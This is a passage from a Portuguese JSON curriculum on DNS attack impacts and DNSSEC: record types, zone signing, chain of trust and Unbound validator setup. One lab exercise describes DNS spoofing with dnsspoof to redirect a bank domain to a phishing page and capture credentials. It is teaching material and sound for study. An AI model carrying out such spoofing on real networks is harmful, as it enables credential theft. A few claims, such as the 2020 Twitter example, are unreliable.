                                    "Discuta interdependências: como DNS afeta IoT, cloud e supply chain.",
                                    "Proponha scoring de risco baseado em probabilidade e impacto.",
                                    "Crie recomendações preventivas baseadas na análise."
                                  ],
                                  "verification": "Produza uma matriz de risco com 5 impactos priorizados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "CVSS Calculator online",
                                    "NIST SP 800-53 controles DNS",
                                    "Ferramenta Excel para matriz de risco"
                                  ],
                                  "tips": "Use escala qualitativa/quantitativa para tornar análise acionável.",
                                  "learningObjective": "Integrar análises parciais em uma avaliação holística de riscos DNS.",
                                  "commonMistakes": [
                                    "Subjetividade sem métricas",
                                    "Ignorar contexto organizacional específico"
                                  ]
                                }
                              ],
                              "practicalExample": "Simule um DNS spoofing em um lab com ferramentas como dnsspoof (dsniff suite) em rede isolada: redirecione 'banco.com' para site phishing falso, monitore roubo de credenciais via Wireshark e meça downtime de serviços dependentes, replicando impactos reais como no hijack de Twitter em 2020.",
                              "finalVerifications": [
                                "Lista precisa de pelo menos 5 impactos específicos de ataques DNS com exemplos.",
                                "Explicação clara de como DNS spoofing leva a phishing direcionado.",
                                "Análise de um caso real com métricas de impacto (ex: horas de downtime).",
                                "Matriz de risco diferenciando impactos imediatos vs. de longo prazo.",
                                "Identificação de 3 vetores de propagação de malware via DNS.",
                                "Recomendações preventivas derivadas da análise."
                              ],
                              "assessmentCriteria": [
                                "Precisão factual e uso de fontes confiáveis (90%+ acurácia).",
                                "Profundidade na cadeia de impactos (causa-efeito claro).",
                                "Integração de exemplos reais com análise crítica.",
                                "Quantificação de severidade (métricas ou escalas usadas).",
                                "Clareza e estrutura na apresentação (diagramas/fluxogramas).",
                                "Originalidade na síntese, evitando cópia direta."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos DNS e TCP/IP.",
                                "Análise de Malware: C2 via DNS em campanhas APT.",
                                "Ética e Direito: Impactos em privacidade (GDPR) e responsabilidade civil.",
                                "Gestão de Riscos: Frameworks como NIST para avaliação de ameaças.",
                                "Análise de Dados: Métricas de incidentes via SIEM logs."
                              ],
                              "realWorldApplication": "Em um SOC (Security Operations Center), analise logs DNS durante um incidente para priorizar respostas, estimar perdas financeiras de downtime/phishing e recomendar DNSSEC ou filtering, como em respostas a ataques como o SolarWinds supply chain onde DNS callbacks foram chave."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.2",
                        "name": "Fundamentos do DNSSEC",
                        "description": "Protocolo de extensão de segurança para DNS (DNSSEC), que adiciona autenticação e integridade por meio de assinaturas criptográficas em registros DNS.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.2.1",
                            "name": "Compreender componentes do DNSSEC",
                            "description": "Identificar registros chave como RRSIG (assinaturas), DNSKEY (chaves públicas), DS (delegação de assinaturas) e NSEC/NSEC3 para negação não ambígua.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Registro DNSKEY (Chaves Públicas)",
                                  "subSteps": [
                                    "Leia a definição de DNSKEY na RFC 4034: registro que armazena chaves públicas da zona.",
                                    "Identifique os campos principais: Flags (KSK/ZSK), Protocolo (3 para DNSSEC), Algoritmo (ex: RSASHA256), Chave Pública.",
                                    "Diferencie KSK (Key Signing Key) para assinar DS e ZSK (Zone Signing Key) para assinar registros da zona.",
                                    "Examine um exemplo de saída de 'dig DNSKEY example.com' para mapear os campos.",
                                    "Anote como múltiplas chaves podem existir para rotação."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre KSK e ZSK e identifique flags em um exemplo real.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "RFC 4034 (seção DNSKEY)",
                                    "Comando dig ou online DNS lookup tool como dnsviz.net"
                                  ],
                                  "tips": "Sempre verifique o algoritmo suportado pelo resolvedor para validar chaves corretamente.",
                                  "learningObjective": "Compreender a estrutura e propósitos das chaves públicas no DNSSEC.",
                                  "commonMistakes": [
                                    "Confundir KSK com ZSK",
                                    "Ignorar o campo de protocolo",
                                    "Não notar múltiplas chaves ativas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender o Registro RRSIG (Assinaturas Digitais)",
                                  "subSteps": [
                                    "Defina RRSIG: assinatura digital sobre um RRset para provar autenticidade e integridade.",
                                    "Analise campos: Tipo coberto, Algoritmo, Labels, TTL original, Timestamp de assinatura, Tempo de expiração, Chave de tag, Nome do assinante, Assinatura.",
                                    "Entenda como RRSIG é gerado: hash do RRset + assinatura com chave privada correspondente ao DNSKEY.",
                                    "Use 'dig example.com TXT +dnssec' para ver RRSIG associado a um registro.",
                                    "Verifique como o resolvedor usa RRSIG para validar contra DNSKEY público."
                                  ],
                                  "verification": "Descreva o processo de validação de um RRSIG com um DNSKEY e identifique campos chave em uma saída dig.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "RFC 4034 (seção RRSIG)",
                                    "Ferramenta dig com +dnssec",
                                    "Exemplo de zona DNSSEC como dnssec-tools.org"
                                  ],
                                  "tips": "RRSIGs expiram; monitore TTL e tempos para evitar falhas de validação.",
                                  "learningObjective": "Explicar como RRSIG garante a integridade dos registros DNS.",
                                  "commonMistakes": [
                                    "Confundir tipo coberto com tipo de registro",
                                    "Ignorar timestamps de validade",
                                    "Não associar RRSIG ao DNSKEY correto"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Registro DS (Delegation Signer)",
                                  "subSteps": [
                                    "Defina DS: registro no domínio pai que aponta para o DNSKEY do filho, estabelecendo chain of trust.",
                                    "Identifique campos: Key Tag, Algoritmo, Digest Type (SHA-1/SHA-256), Digest.",
                                    "Entenda o processo: DS assinado pelo KSK do pai; resolvedor valida DS contra KSK do pai, então usa para validar DNSKEY do filho.",
                                    "Use 'dig DS example.com' para ver DS em um domínio com DNSSEC.",
                                    "Simule chain of trust: raiz -> TLD -> domínio."
                                  ],
                                  "verification": "Trace o chain of trust para um domínio real, identificando DS e seu papel.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "RFC 4034 (seção DS)",
                                    "Comando dig DS +short",
                                    "Ferramentas como dnssec-verify ou intoDNS"
                                  ],
                                  "tips": "DS quebra se KSK muda sem atualização; planeje rollovers cuidadosamente.",
                                  "learningObjective": "Compreender como DS estabelece confiança entre zonas hierárquicas.",
                                  "commonMistakes": [
                                    "Confundir DS com DNSKEY",
                                    "Ignorar digest type",
                                    "Não entender dependência no KSK do pai"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Dominar NSEC e NSEC3 para Provas de Negações Não Ambíguas",
                                  "subSteps": [
                                    "Defina NSEC: registro encadeado que prova não existência de um nome provando intervalo entre nomes existentes.",
                                    "Analise NSEC: Nome seguinte, Tipos de registros, Assinado por RRSIG.",
                                    "Introduza NSEC3: versão hashed para privacidade, com parâmetros Salt, Hash Algoritmo, Iterações, Next Hashed Owner.",
                                    "Compare NSEC (simples mas revela zona) vs NSEC3 (privado mas mais complexo).",
                                    "Examine com 'dig example.com NONEXISTE +dnssec' para ver NSEC/NSEC3 em ação."
                                  ],
                                  "verification": "Explique como NSEC/NSEC3 previne ataques de negação ambígua e forneça exemplo de prova.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "RFC 4034 (NSEC), RFC 5155 (NSEC3)",
                                    "Comando dig com +dnssec para NXDOMAIN"
                                  ],
                                  "tips": "NSEC3 protege contra zone walking; escolha salt forte e iterações adequadas.",
                                  "learningObjective": "Diferenciar e explicar mecanismos de negação no DNSSEC.",
                                  "commonMistakes": [
                                    "Confundir NSEC com NSEC3",
                                    "Não entender hashing em NSEC3",
                                    "Ignorar RRSIG em NSEC"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando 'dig @8.8.8.8 DNSKEY sigok.isc.org +dnssec', identifique DNSKEY (flags 257 para KSK), RRSIG associado, e simule validação; então teste DS com 'dig DS sigok.isc.org' e negação com 'dig nonexistent.sigok.isc.org +dnssec' para ver NSEC3.",
                              "finalVerifications": [
                                "Descreva com precisão os 4 componentes principais (DNSKEY, RRSIG, DS, NSEC/NSEC3).",
                                "Explique o chain of trust usando DS entre zonas pai e filho.",
                                "Identifique e interprete campos chave em saídas reais de dig +dnssec.",
                                "Diferencie NSEC de NSEC3 e seu impacto na privacidade.",
                                "Simule validação de um RRset completo com todos os componentes.",
                                "Responda corretamente a perguntas sobre erros comuns em cada registro."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e descrição de cada registro (90%+ acurácia).",
                                "Capacidade de mapear campos de exemplos reais de ferramentas como dig.",
                                "Compreensão conceitual do chain of trust e validação.",
                                "Diferenciação clara entre componentes semelhantes (ex: KSK/ZSK, NSEC/NSEC3).",
                                "Explicação de como componentes interagem para autenticação completa.",
                                "Identificação de erros comuns e como evitá-los."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia Assimétrica: Uso de chaves públicas/privadas em DNSKEY e RRSIG.",
                                "Segurança de Redes: Proteção contra DNS spoofing e cache poisoning.",
                                "Protocolos de Internet: Extensões ao DNS tradicional (RFCs).",
                                "Matemática Computacional: Hashing e algoritmos em NSEC3 e digests DS.",
                                "Administração de Sistemas: Configuração prática de zonas DNSSEC."
                              ],
                              "realWorldApplication": "Em uma empresa, configure DNSSEC em domínios internos/externos para prevenir ataques como Kaminsky (cache poisoning), garantindo que respostas DNS sejam autênticas e íntegras, reduzindo riscos em serviços web, email e APIs."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.2.2",
                            "name": "Explicar processo de assinatura DNSSEC",
                            "description": "Descrever o fluxo de geração de chaves assimétricas, assinatura de zona com chave privada e validação com chave pública pelo resolvedor.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Geração de Pares de Chaves Assimétricas para DNSSEC",
                                  "subSteps": [
                                    "Escolha o algoritmo de assinatura (ex: RSASHA256) e tamanhos de chave adequados (1024-2048 bits para ZSK, 2048+ para KSK).",
                                    "Gere a Zona Signing Key (ZSK) usando ferramentas como dnssec-keygen para assinar registros da zona.",
                                    "Gere a Key Signing Key (KSK) para assinar a ZSK e estabelecer cadeia de confiança.",
                                    "Armazene chaves privadas de forma segura e gere chaves públicas para publicação.",
                                    "Defina períodos de validade e rotação de chaves (ex: ZSK a cada 30 dias, KSK anual)."
                                  ],
                                  "verification": "Verifique a geração listando arquivos .key e .private gerados e confirmando metadados com dnssec-keygen -l.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "dnssec-keygen (BIND9 ou equivalente)",
                                    "Documentação RFC 4034",
                                    "Ambiente Linux com BIND instalado"
                                  ],
                                  "tips": "Use chaves separadas para ZSK e KSK para otimizar desempenho e segurança; teste em zona de staging primeiro.",
                                  "learningObjective": "Compreender a distinção e propósito de ZSK e KSK na hierarquia de chaves DNSSEC.",
                                  "commonMistakes": [
                                    "Confundir ZSK com KSK",
                                    "Usar chaves simétricas em vez de assimétricas",
                                    "Ignorar rotação de chaves"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Assinatura da Zona DNS com Chave Privada",
                                  "subSteps": [
                                    "Carregue a zona não assinada em formato texto ou use zona inline.",
                                    "Execute dnssec-signzone com a ZSK privada para gerar RRSIG para todos os registros RR da zona.",
                                    "Inclua o registro DNSKEY público da ZSK na zona assinada.",
                                    "Assine o registro DNSKEY da ZSK com a KSK privada, gerando RRSIG correspondente.",
                                    "Gere NSEC ou NSEC3 para negar registros inexistentes e assine-os."
                                  ],
                                  "verification": "Use dig +dnssec zona. example.com para confirmar presença de RRSIG e DNSKEY nos responses.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "dnssec-signzone",
                                    "Zona master file não assinada",
                                    "Chaves ZSK e KSK privadas"
                                  ],
                                  "tips": "Mantenha a zona master separada da signed; automatize com scripts cron para re-assinatura.",
                                  "learningObjective": "Dominar o processo de geração de assinaturas digitais sobre registros DNS.",
                                  "commonMistakes": [
                                    "Assinar sem NSEC/NSEC3, quebrando validação",
                                    "Usar chave errada para assinar DNSKEY",
                                    "Não atualizar serial da zona"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecimento da Cadeia de Confiança e Publicação",
                                  "subSteps": [
                                    "Gere o registro DS com a hash da KSK pública (SHA-256) e Key Tag.",
                                    "Publique DNSKEY (ZSK e KSK públicas) e RRSIG na zona autoritativa.",
                                    "Envie o DS para o registrador de domínio (parent zone) para ancorar a confiança.",
                                    "Configure o nameserver para servir zona signed (auto-dnssec ou manual).",
                                    "Monitore com ferramentas como dnsviz.net para validar cadeia."
                                  ],
                                  "verification": "Confirme DS no parent com dig DS example.com e valide cadeia com dnssec-verify.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "dnssec-dsfromkey",
                                    "Painel de registrador de domínio",
                                    "Ferramentas de validação como dnsviz"
                                  ],
                                  "tips": "Teste DS antes de publicar para evitar downtime; use KSK rollover para transições suaves.",
                                  "learningObjective": "Entender como a cadeia de confiança é ancorada do root ao resolvedor.",
                                  "commonMistakes": [
                                    "DS incorreto causando falha de validação",
                                    "Não publicar DNSKEY público",
                                    "Esquecer rollover"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validação do Processo pelo Resolvedor",
                                  "subSteps": [
                                    "Resolvedor recursivo busca DNSKEY e RRSIG da zona autoritativa.",
                                    "Verifica assinatura dos RR com ZSK pública extraída do DNSKEY.",
                                    "Valida DNSKEY da ZSK com KSK pública via RRSIG correspondente.",
                                    "Confirma KSK com DS do parent zone, propagando confiança do root.",
                                    "Rejeita responses inválidos (BOGUS) e continua com AD flag em queries válidas."
                                  ],
                                  "verification": "Simule com dig +dnssec +multi NS example.com e cheque flags AD/RETCODE.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Resolvedor com validação DNSSEC (Unbound ou BIND)",
                                    "dig ou drill",
                                    "Sites de teste como dnssec-tools.org"
                                  ],
                                  "tips": "Habilite validação no resolvedor local; use +cd para simular cache contaminado.",
                                  "learningObjective": "Explicar o fluxo de verificação criptográfica pelo resolvedor cliente.",
                                  "commonMistakes": [
                                    "Ignorar validação recursiva",
                                    "Confundir validação com resolução",
                                    "Não entender flag AD"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com BIND9: 1) dnssec-keygen -a RSASHA256 example.com (ZSK/KSK). 2) dnssec-signzone -o example.com -k KSK.private example.com ZSK.private. 3) Publique zona.signed e DS no registrador. 4) Valide com dig @8.8.8.8 +dnssec example.com A (verifique AD flag).",
                              "finalVerifications": [
                                "Explicar corretamente a diferença entre ZSK e KSK com exemplos.",
                                "Desenhar diagrama do fluxo de assinatura e validação.",
                                "Simular validação em ferramenta online como dnsviz.net.",
                                "Identificar erro em um DS record inválido.",
                                "Descrever resposta BOGUS em caso de falha de validação.",
                                "Listar 3 ataques mitigados por DNSSEC."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sequência de geração de chaves e assinaturas (90%+ correto).",
                                "Compreensão profunda de assimetria criptográfica e cadeia de confiança.",
                                "Capacidade de identificar e corrigir erros comuns em cenários práticos.",
                                "Uso correto de terminologia (RRSIG, DNSKEY, DS, AD flag).",
                                "Demonstração prática via simulação ou diagrama.",
                                "Explicação clara de aplicações reais e limitações."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia Assimétrica (Matemática/Computação: RSA, hashes SHA).",
                                "Protocolos de Rede (Redes: DNS, hierarquia de zonas).",
                                "Segurança de Sistemas (Cibersegurança: PKI, key management).",
                                "Administração de Sistemas (TI: BIND, automação de zonas).",
                                "Análise de Ameaças (Segurança: DNS cache poisoning, spoofing)."
                              ],
                              "realWorldApplication": "DNSSEC protege domínios governamentais (.gov) e financeiros contra ataques como Kaminsky DNS vulnerability, garantindo autenticidade de responses e prevenindo redirecionamentos maliciosos em resoluções globais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.2.3",
                            "name": "Entender cadeia de confiança",
                            "description": "Analisar a chain of trust do DNSSEC, iniciando na raiz confiável até zonas delegadas, garantindo autenticação hierárquica.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais da Chain of Trust",
                                  "subSteps": [
                                    "Leia a definição oficial de Chain of Trust no RFC 4035 (DNSSEC Resource Records).",
                                    "Identifique os componentes principais: Trust Anchor (TA), Key Signing Key (KSK), Zone Signing Key (ZSK).",
                                    "Desenhe um diagrama simples da hierarquia DNS: raiz > TLD > zona delegada.",
                                    "Explique verbalmente ou por escrito como a confiança é hierárquica e não centralizada.",
                                    "Compare com Chain of Trust em PKI (ex: certificados SSL)."
                                  ],
                                  "verification": "Desenhe e explique o diagrama da hierarquia DNSSEC para um colega ou gravando um vídeo curto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 4035 PDF",
                                    "Papel e caneta ou ferramenta de diagrama como draw.io",
                                    "Vídeo introdutório sobre DNSSEC no YouTube"
                                  ],
                                  "tips": "Comece pela raiz e desça; use analogias como 'cadeia de comando militar' para visualizar.",
                                  "learningObjective": "Dominar os termos e estrutura básica da Chain of Trust em DNSSEC.",
                                  "commonMistakes": [
                                    "Confundir KSK com ZSK",
                                    "Ignorar que a confiança inicia na raiz confiável pré-instalada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Raiz Confiável e Trust Anchors",
                                  "subSteps": [
                                    "Baixe e examine o arquivo root-anchors.txt do IANA.",
                                    "Instale chaves de confiança raiz em um resolvedor DNSSEC como Unbound ou BIND.",
                                    "Use 'dnssec-keygen' para gerar um exemplo de Trust Anchor local.",
                                    "Verifique a assinatura DS do registro raiz usando 'dig +dnssec . DNSKEY'.",
                                    "Liste as chaves raiz ativas e sua validade."
                                  ],
                                  "verification": "Execute comandos dig e confirme que a raiz é validada com AD flag (Authenticated Data).",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Resolvedor DNS local (ex: Unbound)",
                                    "Comandos dig e dnssec-keygen instalados",
                                    "Site IANA root keys"
                                  ],
                                  "tips": "Use sandbox como Docker para testes sem afetar DNS principal.",
                                  "learningObjective": "Identificar e configurar Trust Anchors raiz corretamente.",
                                  "commonMistakes": [
                                    "Usar chaves expiradas",
                                    "Não validar a DS record na delegação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Rastrear a Propagação da Confiança em Delegações",
                                  "subSteps": [
                                    "Escolha um TLD como .com e examine sua DS record na raiz via 'dig +dnssec com. DS'.",
                                    "Siga para uma zona delegada (ex: example.com): verifique DNSKEY, RRSIG e DS da zona pai.",
                                    "Use 'drill' ou 'dnsviz.net' para visualizar a chain visualmente.",
                                    "Simule uma quebra na chain removendo uma DS e observe o erro de validação.",
                                    "Documente a chain completa: Raiz -> TLD -> Zona."
                                  ],
                                  "verification": "Gere um relatório com screenshots de cada DS/DNSKEY validado na chain.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Ferramentas: dig, drill ou online dnsviz.net",
                                    "Domínio de teste como example.com"
                                  ],
                                  "tips": "Sempre cheque +dnssec ou +sigchase no dig para automação.",
                                  "learningObjective": "Mapear como a confiança flui de pai para filho via DS records.",
                                  "commonMistakes": [
                                    "Pular validação de RRSIG",
                                    "Confundir delegação DS com DNSKEY da zona"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e Validar uma Chain of Trust Completa",
                                  "subSteps": [
                                    "Configure um resolvedor com validação DNSSEC ativada.",
                                    "Resolva um domínio DNSSEC-validado (ex: nic.br) com 'dig +dnssec +multi'.",
                                    "Analise a resposta: confirme flags AD, RRSIG chains e ausência de erros.",
                                    "Teste falhas: use domínio com chain quebrada e identifique o ponto de falha.",
                                    "Crie um checklist pessoal para auditoria de chains."
                                  ],
                                  "verification": "Valide 3 domínios diferentes e produza um log de validações bem-sucedidas/falhas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Resolvedor validante (BIND/Unbound)",
                                    "Lista de domínios DNSSEC: dnssec-tools.org",
                                    "Ferramenta dnsviz para debug"
                                  ],
                                  "tips": "Ative logging verbose no resolvedor para ver detalhes da chain.",
                                  "learningObjective": "Aplicar verificação prática para detectar chains válidas ou quebradas.",
                                  "commonMistakes": [
                                    "Ignorar flag CD (Checking Disabled)",
                                    "Não checar rollover de chaves"
                                  ]
                                }
                              ],
                              "practicalExample": "Para validar example.com: 1) dig +dnssec . DS (raiz para .com), 2) dig +dnssec com. DS (TLD para example.com), 3) dig +dnssec example.com DNSKEY (zona própria). Confirme RRSIGs e AD flag em todas as etapas usando dnsviz.net para visualização gráfica.",
                              "finalVerifications": [
                                "Explicar verbalmente a chain de uma zona real sem consultar notas.",
                                "Identificar corretamente o Trust Anchor e pelo menos 3 DS records em uma chain.",
                                "Simular e detectar uma quebra intencional na chain usando ferramentas.",
                                "Configurar um resolvedor básico com validação DNSSEC ativa.",
                                "Produzir diagrama completo de chain para um domínio arbitrário.",
                                "Listar consequências de chain quebrada (ex: rejeição de resolução)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de componentes (TA, DS, KSK/ZSK): 100% correto.",
                                "Capacidade de traçar chain completa sem erros em 3 exemplos.",
                                "Uso correto de ferramentas dig/drill com flags DNSSEC.",
                                "Análise de falhas: pinpoint exato do break na chain.",
                                "Clareza em diagramas e relatórios: legível e completo.",
                                "Tempo de execução: completa verificação em <10 min por domínio."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Assinaturas digitais e chaves assimétricas (RSA/ECDSA).",
                                "Redes: Hierarquia DNS e protocolos de resolução.",
                                "PKI: Analogia com Certificate Authority chains em TLS.",
                                "Segurança: Detecção de ataques como DNS cache poisoning.",
                                "Programação: Scripts em Python com dnspython para automação de checks."
                              ],
                              "realWorldApplication": "Em operações de SOC, validar DNSSEC chains previne MITM e spoofing em infra crítica; navegadores usam chains semelhantes para HSTS/HPKP; administradores de rede auditam zones para compliance GDPR ou PCI-DSS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.3",
                        "name": "Implementação e Verificação DNSSEC",
                        "description": "Práticas para configurar, validar e monitorar DNSSEC, assegurando proteção contra ataques de envenenamento e spoofing em ambientes reais.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.3.1",
                            "name": "Configurar validador DNSSEC",
                            "description": "Demonstrar configuração de um resolvedor como BIND ou Unbound para validar assinaturas DNSSEC, incluindo trust anchors.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparação e Instalação do Resolvedor Unbound",
                                  "subSteps": [
                                    "Atualize os repositórios do sistema com 'sudo apt update'.",
                                    "Instale o Unbound com 'sudo apt install unbound'.",
                                    "Verifique a instalação com 'unbound -V' para confirmar versão com suporte a DNSSEC.",
                                    "Crie um diretório de configuração dedicado, como /etc/unbound/custom/, e defina permissões adequadas (chown unbound:unbound).",
                                    "Faça backup da configuração padrão: 'sudo cp -r /etc/unbound /etc/unbound.backup'."
                                  ],
                                  "verification": "Execute 'unbound-checkconf' para validar configuração inicial sem erros e confirme instalação com 'dpkg -l | grep unbound'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Servidor Linux Ubuntu/Debian 20.04+ com acesso root",
                                    "Conexão à internet",
                                    "Editor de texto como nano ou vim"
                                  ],
                                  "tips": "Use uma VM para testes isolados para evitar impactos em produção.",
                                  "learningObjective": "Entender o processo de instalação e preparação inicial de um resolvedor DNS com suporte a DNSSEC.",
                                  "commonMistakes": [
                                    "Não atualizar repositórios levando a pacotes desatualizados",
                                    "Ignorar permissões de arquivos causando falhas de inicialização",
                                    "Pular backup expondo configurações originais a perda"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configuração Básica do Resolvedor",
                                  "subSteps": [
                                    "Edite /etc/unbound/unbound.conf adicionando server: interface: 127.0.0.1 e access-control: 127.0.0.0/8 allow.",
                                    "Habilite resolução recursiva com 'do-ip4: yes', 'do-ip6: no' (se IPv6 desnecessário), e 'harden-glue: yes'.",
                                    "Defina cache mínimo com cache-min-ttl: 300 e cache-max-ttl: 86400.",
                                    "Teste configuração com 'unbound-checkconf /etc/unbound/unbound.conf'.",
                                    "Reinicie o serviço: 'sudo systemctl restart unbound' e habilite no boot: 'sudo systemctl enable unbound'."
                                  ],
                                  "verification": "Use 'dig example.com @127.0.0.1' para confirmar resolução básica sem erros e verifique status com 'systemctl status unbound'.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Arquivo de configuração unbound.conf",
                                    "Comando dig instalado (dnsutils)"
                                  ],
                                  "tips": "Sempre valide configuração com unbound-checkconf antes de reiniciar para evitar downtime.",
                                  "learningObjective": "Configurar um resolvedor DNS recursivo funcional como base para validação DNSSEC.",
                                  "commonMistakes": [
                                    "Configurações de access-control muito permissivas expondo o resolvedor",
                                    "Esquecer de reiniciar serviço após edições",
                                    "TTL inadequados causando cache ineficiente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configuração de Validação DNSSEC e Trust Anchors",
                                  "subSteps": [
                                    "Adicione ao unbound.conf: module-config: \"validator iterator\", val-clean-additional: yes, val-permissive-mode: no.",
                                    "Configure trust anchors: auto-trust-anchor-file: \"/var/lib/unbound/root.key\" e inicialize com 'sudo unbound-anchor -a /var/lib/unbound/root.key'.",
                                    "Habilite validação com harden-dnssec-stripped: yes e use-validator: yes.",
                                    "Ajuste logs para debug: verbosity: 2 em server: e defina log-queries: yes temporariamente.",
                                    "Valide e reinicie: unbound-checkconf e systemctl restart unbound."
                                  ],
                                  "verification": "Execute 'unbound-anchor -a /var/lib/unbound/root.key' novamente para confirmar chave atualizada e cheque logs em /var/log/unbound para entradas de validação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Chave root.key gerada pelo unbound-anchor",
                                    "Permissões de escrita em /var/lib/unbound"
                                  ],
                                  "tips": "Monitore logs durante configuração inicial para detectar problemas de trust anchor.",
                                  "learningObjective": "Implementar mecanismos de validação DNSSEC incluindo configuração de âncoras de confiança.",
                                  "commonMistakes": [
                                    "Não inicializar root.key causando falhas de validação",
                                    "val-permissive-mode: yes em produção reduzindo segurança",
                                    "Permissões erradas no root.key impedindo atualizações automáticas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testes e Verificação Final da Configuração",
                                  "subSteps": [
                                    "Teste validação com 'dig +dnssec dnssec-failed.org @127.0.0.1' esperando SERVFAIL.",
                                    "Teste domínio válido assinado: 'dig +dnssec www.example.com @127.0.0.1' verificando flags AD (Authenticated Data).",
                                    "Use 'drill +dnssec sigok.isc.org @127.0.0.1' para confirmar validação positiva.",
                                    "Monitore logs por erros e desabilite log-queries após testes.",
                                    "Documente configuração e crie script de verificação automatizado."
                                  ],
                                  "verification": "Todos os testes DNSSEC retornam AD flag em domínios válidos e SERVFAIL em inválidos; logs sem erros persistentes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas: dig (dnsutils), drill (ldnsutils)",
                                    "Domínios de teste DNSSEC conhecidos"
                                  ],
                                  "tips": "Use domínios de teste padrão como dnssec-failed.org para validação rápida.",
                                  "learningObjective": "Verificar e validar a configuração DNSSEC através de testes práticos.",
                                  "commonMistakes": [
                                    "Ignorar flag AD confundindo autenticação",
                                    "Testar apenas domínios não-assinados",
                                    "Não testar falhas levando a falsos positivos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Ubuntu de uma pequena empresa, configure Unbound como resolvedor local para validar DNSSEC, protegendo contra spoofing em consultas para serviços internos como mail.example.com, usando trust anchors da ICANN root.",
                              "finalVerifications": [
                                "Consulta 'dig +dnssec sigok.isc.org @127.0.0.1' retorna flag AD e RRSIG válida.",
                                "Consulta 'dig +dnssec dnssec-failed.org @127.0.0.1' resulta em SERVFAIL.",
                                "Logs do Unbound (/var/log/syslog ou /var/log/unbound) mostram validações bem-sucedidas sem erros de assinatura.",
                                "'unbound-control status' confirma validator ativo e stats de validação.",
                                "Teste de envenenamento simulado falha devido à validação.",
                                "Root key atualizada automaticamente via unbound-anchor."
                              ],
                              "assessmentCriteria": [
                                "Configuração sem erros de sintaxe (unbound-checkconf passa).",
                                "Validação DNSSEC funciona corretamente em testes positivos e negativos.",
                                "Trust anchors configurados e atualizáveis automaticamente.",
                                "Resolvedor responde apenas a clientes autorizados (access-control).",
                                "Desempenho aceitável com cache habilitado (tempo de resposta < 100ms).",
                                "Documentação de configuração e testes fornecida."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Compreensão de assinaturas digitais RSA/DNSCurve.",
                                "Administração de Sistemas Linux: Gerenciamento de serviços systemd.",
                                "Segurança de Redes: Proteção contra ataques MITM e DNS cache poisoning.",
                                "Protocolos de Internet: Extensões DNS (RFC 4033-4035).",
                                "Monitoramento e Logs: Análise de logs para troubleshooting."
                              ],
                              "realWorldApplication": "Configuradores de DNSSEC em resolvedores como Unbound são essenciais em ISPs, data centers e empresas para prevenir ataques de DNS spoofing, garantindo que apenas respostas DNS autênticas sejam aceitas, protegendo tráfego sensível como banking e email corporativo contra manipulação."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.3.2",
